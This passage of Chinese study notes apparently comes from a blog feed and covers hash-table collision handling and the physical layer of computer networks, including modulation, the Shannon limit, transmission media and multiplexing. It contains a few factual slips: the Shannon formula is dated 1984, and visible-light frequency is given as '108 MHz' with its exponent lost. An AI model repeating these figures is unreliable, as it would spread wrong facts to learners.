href="#5-1-3-数字分析法" class="headerlink" title="5.1.3 数字分析法"></a>5.1.3 数字分析法</h3><p>设关键字是 r 进制数（如十进制数），而 r 个数码在各位上出现的频率不一定相同，此时应选取数码分布较均匀的若干位作为散列地址。</p><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/%E6%95%B0%E5%AD%97%E5%88%86%E6%9E%90%E6%B3%95.png"></p><p>这种方法适用于已知的关键字集合，若更换了关键字，则需要重新构造新的散列函数。</p><h3 id="5-1-4-平方取中法"><a href="#5-1-4-平方取中法" class="headerlink" title="5.1.4 平方取中法"></a>5.1.4 平方取中法</h3><p>构造：取关键字平方后中间几位作哈希地址</p><p>适用范围：关键字的每位取值都不够均匀或均小于散列地址所需的位数。</p><p>在不同的情况下，不同的散列函数具有不同的性能，因此不能笼统地说哪种散列函数最好。在实际选择中，采用何种构造散列函数的方法取决于关键字集合的情况，但目标是尽量降低产生冲突的可能性。</p><h2 id="5-2-处理冲突的方法"><a href="#5-2-处理冲突的方法" class="headerlink" title="5.2 处理冲突的方法"></a>5.2 处理冲突的方法</h2><h3 id="5-2-1-开放定址法"><a href="#5-2-1-开放定址法" class="headerlink" title="5.2.1 开放定址法"></a>5.2.1 开放定址法</h3><p>当冲突发生时，形成一个探查序列；沿此序列逐个地址探查，直到找到一个空位置（开放的地址），将发生冲突的记录放到该地址中，即：</p><p>$$<br>H i&#x3D;(H(k e y)+d i) \% m, \quad i&#x3D;1,2, \cdots \cdots \cdot k(k \leq m-1)<br>$$</p><p>其中：H(key)是哈希函数，m是哈希表表长，di是增量序列。</p><p>取定某一增量序列后，对应的处理方法就是确定的，通常有以下4中取法。</p><h4 id="5-2-1-1-线性探测法"><a href="#5-2-1-1-线性探测法" class="headerlink" title="5.2.1.1 线性探测法"></a>5.2.1.1 线性探测法</h4><p>$$<br>f_{i}(k e y)&#x3D;\left(f(k e y)+d_{i}\right) \% m\left(d_{i}&#x3D;1,2,3, \cdots, m-1\right)<br>$$</p><p>使用该公式<strong>用于解决冲突的开放定址法</strong>称为<strong>线性探测法</strong>。</p><p>对于<strong>线性探测法</strong>，在出现冲突时，它只能<strong>晚后一步一步检测</strong>看<strong>是否有空位置</strong>，假设此时该冲突位置<strong>后</strong>续<strong>没有可用位置</strong>，但前面<strong>有一个空位置</strong>。<strong>尽管</strong>可以不断地求余数后得到结果，但效率很差。</p><h4 id="5-2-1-2-二次探测法"><a href="#5-2-1-2-二次探测法" class="headerlink" title="5.2.1.2 二次探测法"></a>5.2.1.2 二次探测法</h4><p>因此可以改进该算法，增加双向寻找可能的<strong>空位置</strong>，这种新算法称为<strong>二次探测法</strong>：</p><p>$$<br>f_{i}(k e y)&#x3D;\left(f(k e y)+d_{i}\right) \% m\left(d_{i}&#x3D;1^{2},-1^{2}, 2^{2},-2^{2}, \cdots, q^{2},-q^{2}, q \leq m &#x2F; 2\right)<br>$$</p><p>散列表长度m必须是一个可以表示成4k+3的素数，才能保证探测到所有位置。</p><blockquote><p>为什么？</p></blockquote><p>缺点是不能探测到散列表上的所有单元，但至少到探测到一半单元。</p><h4 id="5-2-1-3-随机探测法"><a href="#5-2-1-3-随机探测法" class="headerlink" title="5.2.1.3 随机探测法"></a>5.2.1.3 随机探测法</h4><p>此外还有一种方法是，在冲突时，对于<strong>位移量</strong>$d_{i}$采用<strong>随机函数计算</strong>得到，称为<strong>随机探测法</strong>：</p><p>$$<br>f_{i}(k e y)&#x3D;\left(f(k e y)+d_{i}\right) \% m\left(d_{i}\right. 是一个随机数列 )<br>$$</p><p>这里的随机其实是<strong>伪随机数</strong>，即设置<strong>相同</strong>的随机种子，则<strong>不断调用随机函数的过程中</strong>就<strong>可以生成不会重复的数列</strong>。</p><p>同时，在查找时，用<strong>同样的随机种子</strong>，它每次得到的<strong>数列也是相同</strong>的。</p><blockquote><p>例：表长为11的哈希表中已填有关键字为17，60，29的记录，H(key)&#x3D;key % 11，现有第4个记录，其关键字为38，按三种处理冲突的方法，将它填入表中。</p></blockquote><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/image_ZM1gtdzhqc.png"></p><h4 id="5-2-1-4-再散列函数法"><a href="#5-2-1-4-再散列函数法" class="headerlink" title="5.2.1.4 再散列函数法"></a>5.2.1.4 再散列函数法</h4><p>当通过第一个散列函数得到的地址发生冲突时，则利用第二个散列函数计算该关键字的地址增量。即<strong>提供多个散列函数</strong>：</p><p>$$<br>f_{i}(k e y)&#x3D;(f(key)+i\times f_{2}(key))%m<br>$$</p><p>在再散列法中，最多经过m - 1 次探测就会遍历表中所有位置。</p><h3 id="5-2-2-拉链法"><a href="#5-2-2-拉链法" class="headerlink" title="5.2.2 拉链法"></a>5.2.2 拉链法</h3><p>用拉链法处理冲突的办法是：把具有相同散列地址的关键字(同义词)值放在同一个单链表中，称为同义词链表。</p><p>有m个散列地址就有m个链表，同时用指针数组T[0..m-1]存放各个链表的头指针，凡是散列地址为i的记录都以结点方式插入到以T[i]为指针的单链表中。T中各分量的初值应为空指针。</p><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/image_ddVGUp0vAf.png"></p><p>用拉链法处理冲突，虽然比开放定址法多占用一些存储空间用做链接指针，但它可以减少在插入和查找过程中同关键字平均比较次数(平均查找长度)，这是因为，在拉链法中待比较的结点都是同义词结点，而在开放定址法中，待比较的结点不仅包含有同义词结点，而且包含有非同义词结点，往往非同义词结点比同义词结点还要多。</p><h2 id="5-3-散列查找及性能分析"><a href="#5-3-散列查找及性能分析" class="headerlink" title="5.3 散列查找及性能分析"></a>5.3 散列查找及性能分析</h2><p>散列表的查找过程与构造散列表的过程基本一致，对于一个给定的关键字key，根据散列函数可以计算出其散列地址。</p><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/image_UJBnGUy8AC.png"></p><p>哈希查找过程仍是一个给定值与关键字进行比较的过程，评价哈希查找效率仍要用ASL。</p><p>哈希查找过程与给定值进行比较的关键字的个数取决于：</p><ol><li><p>哈希函数</p></li><li><p>处理冲突的方法</p></li><li><p>哈希表的填满因子α &#x3D; 表中填入的记录数 &#x2F; 哈希表长度</p></li></ol><blockquote><p>例：已知一组关键字(19,14,23,1,68,20,84,27,55,11,10,79)，哈希函数为：H(key)&#x3D;key % 13, 哈希表长为m&#x3D;16，设每个记录的查找概率相等。</p></blockquote><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/image_FBwinCxycx.png"></p><p><img src="/2024/06/09/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC7%E7%AB%A0%EF%BC%9A%E6%9F%A5%E6%89%BE/image__baypE4H8D.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络第2章：物理层</title>
      <link href="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/"/>
      <url>/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="1-物理层的基本概念"><a href="#1-物理层的基本概念" class="headerlink" title="1 物理层的基本概念"></a>1 物理层的基本概念</h1><p>物理层考虑的是<strong>怎样才能在连接各种计算机的传输媒体上传输数据比特流</strong>，而不是指具体的传输媒体。</p><p>物理层的作用是要尽可能地屏蔽掉不同传输媒体和通信手段的差异。</p><p>用于物理层的协议也常称为物理层规程 (procedure)。</p><p>物理层的主要任务：确定与传输媒体的接口的一些特性。</p><ul><li><strong>机械特性</strong>：指明接口所用接线器的形状和尺寸、引线数目和排列、固定和锁定装置等。</li><li><strong>电气特性</strong>：指明在接口电缆的各条线上出现的电压的范围。</li><li><strong>功能特性</strong>：指明某条线上出现的某一电平的电压的意义。</li><li><strong>过程特性</strong> ：指明对于不同功能的各种可能事件的出现顺序。</li></ul><hr><h1 id="2-数据通信的基础知识"><a href="#2-数据通信的基础知识" class="headerlink" title="2 数据通信的基础知识"></a>2 数据通信的基础知识</h1><h2 id="2-1-数据通信系统的模型"><a href="#2-1-数据通信系统的模型" class="headerlink" title="2.1 数据通信系统的模型"></a>2.1 数据通信系统的模型</h2><p>一个数据通信系统包括三大部分：源系统（或发送端、发送方）、传输系统（或传输网络）和目的系统（或接收端、接收方）。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_QOgVK-cr8C.png"></p><h3 id="2-1-1-常用术语-xD"><a href="#2-1-1-常用术语-xD" class="headerlink" title="2.1.1 常用术语&#xD;"></a>2.1.1 常用术语&#xD;</h3><ul><li><strong>数据</strong> (data) —— 运送消息的实体。</li><li><strong>信号</strong>(signal) —— 数据的电气的或电磁的表现。</li><li><strong>模拟信号</strong> (analogous signal) —— 代表消息的参数的取值是<strong>连续</strong>的。</li><li><strong>数字信号</strong> (digital signal) —— 代表消息的参数的取值是<strong>离散</strong>的。</li><li><strong>码元</strong>(code) —— 在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形。</li></ul><h3 id="2-1-2-有关信道的几个基本概念"><a href="#2-1-2-有关信道的几个基本概念" class="headerlink" title="2.1.2 有关信道的几个基本概念"></a>2.1.2 有关信道的几个基本概念</h3><ul><li><strong>信道</strong> —— 一般用来表示向某一个方向传送信息的媒体。</li><li><strong>单向通信</strong>（单工通信）——只能有一个方向的通信而没有反方向的交互。</li><li><strong>双向交替通信</strong>（半双工通信）——通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)。</li><li><strong>双向同时通信</strong>（全双工通信）——通信的双方可以同时发送和接收信息。</li><li><strong>基带信号</strong>（即基本频带信号）—— <strong>来自信源的信号</strong>。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。</li></ul><blockquote><p>基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。因此必须对基带信号进行调制 (modulation)。</p></blockquote><p>调制分为两大类：</p><ol><li>基带调制：仅对基带信号的<strong>波形</strong>进行变换，使它能够与信道特性相适应。变换后的信号仍然是基带信号。把这种过程称为编码 (coding)。</li><li>带通调制：使用<strong>载波</strong> (carrier)进行调制，把基带信号的频率范围搬移到较高的频段，并转换为模拟信号，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道） 。</li></ol><p><strong>带通信号</strong> ：经过载波调制后的信号。</p><h3 id="2-1-3-常用编码方式"><a href="#2-1-3-常用编码方式" class="headerlink" title="2.1.3 常用编码方式"></a>2.1.3 常用编码方式</h3><ul><li><strong>不归零制</strong>：正电平代表 1，负电平代表 0。</li><li><strong>归零制</strong>：正脉冲代表 1，负脉冲代表 0。</li><li><strong>曼彻斯特编码</strong>：位周期中心的向上跳变代表 0，位周期中心的向下跳变代表 1。但也可反过来定义。</li><li><strong>差分曼彻斯特编码</strong>：在每一位的中心处始终都有跳变。位开始边界有跳变代表 0，而位开始边界没有跳变代表 1。</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_a0sda54b0i.png"></p><p>从信号波形中可以看出，曼彻斯特 (Manchester) 编码和差分曼彻斯特编码产生的信号频率比不归零制高。</p><blockquote><p>怎么看出来的？</p></blockquote><p>从自同步能力来看，不归零制不能从信号波形本身中提取信号时钟频率（这叫做没有自同步能力），而曼彻斯特编码和差分曼彻斯特编码具有自同步能力。</p><h3 id="2-1-4-基本的带通调制方法"><a href="#2-1-4-基本的带通调制方法" class="headerlink" title="2.1.4 基本的带通调制方法"></a>2.1.4 基本的带通调制方法</h3><p>基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。为了解决这一问题，就必须对基带信号进行调制 (modulation)。</p><p>最基本的二元制调制方法有以下几种：</p><ol><li>调幅(AM)：载波的振幅随基带数字信号而变化。</li><li>调频(FM)：载波的频率随基带数字信号而变化。</li><li>调相(PM) ：载波的初始相位随基带数字信号而变化。</li></ol><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_5k7F58_usg.png"></p><h3 id="2-1-5-正交振幅调制-QAM-Quadrature-Amplitude-Modulation-x20"><a href="#2-1-5-正交振幅调制-QAM-Quadrature-Amplitude-Modulation-x20" class="headerlink" title="2.1.5 正交振幅调制 QAM (Quadrature Amplitude Modulation)&#x20;"></a>2.1.5 正交振幅调制 QAM (Quadrature Amplitude Modulation)&#x20;</h3><p>为了达到更高的信息传输速率，必须采用技术上更为复杂的多元制的振幅相位混合调制方法。例如：</p><ul><li>可供选择的相位有 12 种，而对于每一种相位有 1 或 2 种振幅可供选择。总共有 16 种组合，即 16 个码元。</li><li>由于 4 bit 编码共有 16 种不同的组合，因此这 16 个点中的每个点可对应于一种 4 bit 的编码。数据传输率可提高 4 倍。</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_MmtaRpjjSV.png"></p><p>不是码元越多越好。若每一个码元可表示的比特数越多，则在接收端进行解调时要正确识别每一种状态就越困难，出错率增加。&#x20;</p><h2 id="2-2-信道的极限容量"><a href="#2-2-信道的极限容量" class="headerlink" title="2.2 信道的极限容量"></a>2.2 信道的极限容量</h2><p>任何实际的信道都不是理想的，在传输信号时会产生各种失真以及带来多种干扰。</p><p>码元传输的速率越高，或信号传输的距离越远，或传输媒体质量越差，在信道的输出端的波形的失真就越严重。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_TRLVp3yAkS.png"></p><p>从概念上讲，限制码元在信道上的传输速率的因素有以下两个：</p><ol><li>信道能够通过的频率范围</li><li>信噪比</li></ol><h3 id="2-2-1-信道能够通过的频率范围"><a href="#2-2-1-信道能够通过的频率范围" class="headerlink" title="2.2.1 信道能够通过的频率范围"></a>2.2.1 信道能够通过的频率范围</h3><p>具体的信道所能通过的频率范围总是有限的，信号中的许多高频分量往往不能通过信道。</p><p>1924 年，奈奎斯特（Nyquist）就推导出了著名的奈氏准则。他给出了在假定的理想条件下，为了避免码间串扰，码元的传输速率的上限值。</p><p>在任何信道中，码元传输的速率是有上限的，否则就会出现码间串扰的问题，使接收端对码元的判决（即识别）成为不可能。</p><blockquote><p>如果信道的频带越宽，也就是能够通过的信号高频分量越多，那么就可以用更高的速率传送码元而不出现码间串扰。</p></blockquote><h3 id="2-2-2-信噪比"><a href="#2-2-2-信噪比" class="headerlink" title="2.2.2 信噪比"></a>2.2.2 信噪比</h3><p>噪声存在于所有的电子设备和通信信道中。噪声是随机产生的，它的瞬时值有时会很大。因此噪声会使接收端对码元的判决产生错误。</p><p>但噪声的影响是相对的。如果信号相对较强，那么噪声的影响就相对较小。</p><p>信噪比就是<strong>信号的平均功率和噪声的平均功率之比</strong>，常记为$\frac{S}{N}$，并用分贝 (dB) 作为度量单位。即：</p><p>$$<br>信噪比(dB) &#x3D; 10 \log _{10}(\frac{S}{N})(\mathrm{dB})<br>$$</p><p>例如，当$\frac{S}{N}&#x3D;10$时，信噪比为10dB，而当$\frac{S}{N}&#x3D;10^3$时，信噪比为30dB。</p><h3 id="2-2-3-香农公式"><a href="#2-2-3-香农公式" class="headerlink" title="2.2.3 香农公式"></a>2.2.3 香农公式</h3><p>1984年，香农（Shannon）用信息论的理论推导出了带宽受限且有高斯白噪声干扰的信道的极限、无差错的信息传输速率（香农公式）。</p><p>信道的极限信息传输速率 C 可表达为：</p><p>$$<br>C&#x3D;W \log _{2}(1+ \frac{S}{N}) \quad (bit&#x2F;s)<br>$$</p><p>其中：W 为信道的带宽（以 Hz 为单位），S 为信道内所传信号的平均功率，N 为信道内部的高斯噪声功率。</p><p>信道的带宽或信道中的信噪比越大，则信息的极限传输速率就越高。</p><p>只要信息传输速率低于信道的极限信息传输速率，就一定可以找到某种办法来实现无差错的传输。</p><p>若信道带宽 W 或信噪比 S&#x2F;N 没有上限（当然实际信道不可能是这样的），则信道的极限信息传输速率 C 也就没有上限。</p><p>实际信道上能够达到的信息传输速率要比香农的极限传输速率低不少。</p><p>对于频带宽度已确定的信道，如果信噪比不能再提高了，并且码元传输速率也达到了上限值，那么还有办法提高信息的传输速率。</p><blockquote><p>这就是：用编码的方法让每一个码元携带更多比特的信息量。</p></blockquote><hr><h1 id="3-物理层下面的传输媒体"><a href="#3-物理层下面的传输媒体" class="headerlink" title="3 物理层下面的传输媒体"></a>3 物理层下面的传输媒体</h1><p>传输媒体也称为传输介质或传输媒介，它就是数据传输系统中在发送器和接收器之间的物理通路。</p><p>传输媒体可分为两大类，即导引型传输媒体和非导引型传输媒体。</p><p>在导引型传输媒体中，电磁波被导引沿着固体媒体（铜线或光纤）传播。</p><p>非导引型传输媒体就是指自由空间。在非导引型传输媒体中，电磁波的传输常称为无线传输。</p><p>电信领域使用的电磁波的频谱：</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_9o0BadiZUX.png"></p><h2 id="3-1-导引型传输媒体"><a href="#3-1-导引型传输媒体" class="headerlink" title="3.1 导引型传输媒体"></a>3.1 导引型传输媒体</h2><h3 id="3-1-1-双绞线"><a href="#3-1-1-双绞线" class="headerlink" title="3.1.1 双绞线"></a>3.1.1 双绞线</h3><p>双绞线是最常用的传输媒体。模拟传输和数字传输都可以使用双绞线，其通信距离一般为几到十几公里。分为以下两种：</p><ul><li>屏蔽双绞线 STP (Shielded Twisted Pair)，带金属屏蔽层</li><li>无屏蔽双绞线 UTP (Unshielded Twisted Pair)</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_Nq7je_0xts.png"></p><h3 id="3-1-2-双绞线标准-xD"><a href="#3-1-2-双绞线标准-xD" class="headerlink" title="3.1.2 双绞线标准&#xD;"></a>3.1.2 双绞线标准&#xD;</h3><p>1991 年，美国电子工业协会 EIA 和电信行业协会联合发布了一个用于室内传送数据的无屏蔽双绞线和屏蔽双绞线的标准 EIA&#x2F;TIA-568。</p><p>1995 年将布线标准更新为 EIA&#x2F;TIA-568-A。</p><p>此标准规定了 5 个种类的 UTP 标准（从 1 类线到 5 类线）。对传送数据来说，现在最常用的 UTP 是5类线（Category 5 或 CAT5）。</p><p>常用的绞合线的类别、带宽和典型应用</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_0y-pntC1MS.png"></p><h3 id="3-1-3-同轴电缆"><a href="#3-1-3-同轴电缆" class="headerlink" title="3.1.3 同轴电缆"></a>3.1.3 同轴电缆</h3><p>同轴电缆具有很好的抗干扰特性，被广泛用于传输较高速率的数据。同轴电缆的带宽取决于电缆的质量。</p><ul><li>50 Ω 同轴电缆 —— LAN &#x2F; 数字传输常用</li><li>75 Ω 同轴电缆 —— 有线电视 &#x2F; 模拟传输常用</li></ul><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_f_nrJUYnXN.png"></p><h3 id="3-1-4-光纤"><a href="#3-1-4-光纤" class="headerlink" title="3.1.4 光纤"></a>3.1.4 光纤</h3><p>光纤是光纤通信的传输媒体。</p><p>由于<strong>可见光</strong>的频率非常高，约为 108 MHz 的量级，因此一个光纤通信系统的传输带宽远远大于目前其他各种传输媒体的带宽。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_LK3wxYOWlx.png"></p><p>当光线从高折射率的媒体射向低折射率的媒体时，其折射角将大于入射角。因此，如果入射角足够大，就会出现全反射，光也就沿着光纤传输下去。</p><h3 id="3-1-5-光纤的工作原理"><a href="#3-1-5-光纤的工作原理" class="headerlink" title="3.1.5 光纤的工作原理"></a>3.1.5 光纤的工作原理</h3><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_7r22Vu66sC.png"></p><p>只要从纤芯中射到纤芯表面的光线的入射角大于某个临界角度，就可产生全反射。</p><h4 id="3-1-5-1-多模光纤"><a href="#3-1-5-1-多模光纤" class="headerlink" title="3.1.5.1 多模光纤"></a>3.1.5.1 多模光纤</h4><p>可以存在多条不同角度入射的光线在一条光纤中传输。这种光纤就称为多模光纤。</p><h4 id="3-1-5-2-单模光纤"><a href="#3-1-5-2-单模光纤" class="headerlink" title="3.1.5.2 单模光纤"></a>3.1.5.2 单模光纤</h4><p>若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射。这样的光纤称为单模光纤。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_tnS2pPA5_r.png"></p><h4 id="3-1-5-3-光纤通信中使用的光波的波段"><a href="#3-1-5-3-光纤通信中使用的光波的波段" class="headerlink" title="3.1.5.3 光纤通信中使用的光波的波段"></a>3.1.5.3 光纤通信中使用的光波的波段</h4><p>常用的三个波段的中心分别位于 850 nm, 1300 nm 和 1550 nm。</p><p>所有这三个波段都具有 25000~30000 GHz 的带宽，可见光纤的通信容量非常大。</p><h4 id="3-1-5-4-光纤优点"><a href="#3-1-5-4-光纤优点" class="headerlink" title="3.1.5.4 光纤优点"></a>3.1.5.4 光纤优点</h4><ol><li>通信容量非常大。</li><li>传输损耗小，中继距离长。</li><li>抗雷电和电磁干扰性能好。</li><li>无串音干扰，保密性好。</li><li>体积小，重量轻。</li></ol><h2 id="3-2-非导引型传输媒体"><a href="#3-2-非导引型传输媒体" class="headerlink" title="3.2 非导引型传输媒体"></a>3.2 非导引型传输媒体</h2><p>将<strong>自由空间</strong>称为“非导引型传输媒体”，无线传输所使用的频段很广。</p><p>短波通信（即高频通信）主要是靠电离层的反射，但短波信道的通信质量较差，传输速率低。微波在空间主要是直线传播。</p><p>传统微波通信有两种方式：</p><ol><li>地面微波接力通信</li><li>卫星通信</li></ol><h3 id="3-2-1-无线局域网使用的-ISM-频段"><a href="#3-2-1-无线局域网使用的-ISM-频段" class="headerlink" title="3.2.1  无线局域网使用的 ISM 频段"></a>3.2.1  无线局域网使用的 ISM 频段</h3><p>要使用某一段无线电频谱进行通信，通常必须得到本国政府有关无线电频谱管理机构的许可证。但是，也有一些无线电频段是可以自由使用的。例如：ISM。各国的 ISM 标准有可能略有差别。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_Ddgy5aQ3H3.png"></p><hr><h1 id="4-信道复用技术"><a href="#4-信道复用技术" class="headerlink" title="4 信道复用技术"></a>4 信道复用技术</h1><p>复用（multiplexing）是通信技术中的基本概念，它允许用户使用一个共享信道进行通信，降低成本，提高利用率。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_6NclGImRos.png"></p><h2 id="4-1-频分复用-FDM"><a href="#4-1-频分复用-FDM" class="headerlink" title="4.1 频分复用 FDM"></a>4.1 频分复用 FDM</h2><p>频分复用（Frequency Division Multiplexing）是将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。</p><p>频分复用的所有用户在同样的时间占用不同的带宽资源（请注意，这里的“带宽”是频率带宽而不是数据的发送速率）。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_-WcW1n-lF6.png"></p><h2 id="4-2-时分复用TDM"><a href="#4-2-时分复用TDM" class="headerlink" title="4.2 时分复用TDM"></a>4.2 时分复用TDM</h2><p>时分复用则是将时间划分为一段段等长的时分复用帧（TDM帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙。</p><p>每一个用户所占用的时隙是周期性地出现（其周期就是TDM帧的长度）的。</p><p>TDM 信号也称为等时 (isochronous) 信号。时分复用的所有用户在不同的时间占用同样的频带宽度。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_HHFO2Vi-YC.png"></p><h3 id="4-2-1-时分复用可能会造成线路资源的浪费-xD"><a href="#4-2-1-时分复用可能会造成线路资源的浪费-xD" class="headerlink" title="4.2.1 时分复用可能会造成线路资源的浪费 &#xD;"></a>4.2.1 时分复用可能会造成线路资源的浪费 &#xD;</h3><p>使用时分复用系统传送计算机数据时，由于计算机数据的突发性质，用户对分配到的子信道的利用率一般是不高的。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_xVtjEABj4v.png"></p><h2 id="4-3-统计时分复用-STDM-x20"><a href="#4-3-统计时分复用-STDM-x20" class="headerlink" title="4.3 统计时分复用 STDM &#x20;"></a>4.3 统计时分复用 STDM &#x20;</h2><p>统计时分复用STDM  (Statistic TDM) 是一种改进的时分复用，它能明显地提高信道的利用率。</p><p>集中器常使用这种统计时分复用，如下图所示一个使用统计时分复用的集中器常连接4个低俗用户，然后将其数据集中起来通过高速线路发送到一个远地计算机。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_1mO5waHkH5.png"></p><p>各用户有了数据就随时发往集中器的输入缓存，然后集中器按顺序依次扫描输入缓存，把缓存中的输入数据放入STDM帧中。对没有数据的缓存就跳过去，当一个帧的数据满了，就发送出去。</p><h2 id="4-4-波分复用-WDM"><a href="#4-4-波分复用-WDM" class="headerlink" title="4.4 波分复用 WDM"></a>4.4 波分复用 WDM</h2><p>波分复用 WDM（Wavelength Division Multiplexing）就是光的频分复用。由于习惯上用波长而不用频率来表示所使用的光载波，这样就产生了波分复用。</p><p><img src="/2024/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E7%89%A9%E7%90%86%E5%B1%82/image_UEdy8LfSd8.png"></p><h2 id="4-5-码分复用-CDM"><a href="#4-5-码分复用-CDM" class="headerlink" title="4.5 码分复用 CDM"></a>4.5 码分复用 CDM</h2><p>常用的名词是码分多址 CDMA（Code Division Multiple Access）。</p><p>各用户使用经过特殊挑选的不同码型，因此彼此不会造成干扰。这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。</p><h3 id="4-5-1-码片序列"><a href="#4-5-1-码片序列" class="headerlink" title="4.5.1 码片序列"></a>4.5.1 码片序列</h3><p>每一个比特时间划分为 m 个短的间隔，称为码片 (chip)。每个站被指派一个唯一的 m bit 码片序列（chip sequence）。</p><ol><li>如发送比特 1，则发送自己的 m bit 码片序列。</li><li>如发送比特 0，则发送该码片序列的二进制反码。</li></ol><p>例如，S 站的 8 bit 码片序列是 00011011。</p><ol><li>发送比特 1 时，就发送序列 00011011，</li><li>发送比特 0 时，就发送序列 11100100。</li></ol><p>S 站的码片序列：(–1 –1 –1 +1 +1 –1 +1 +1)</p><h3 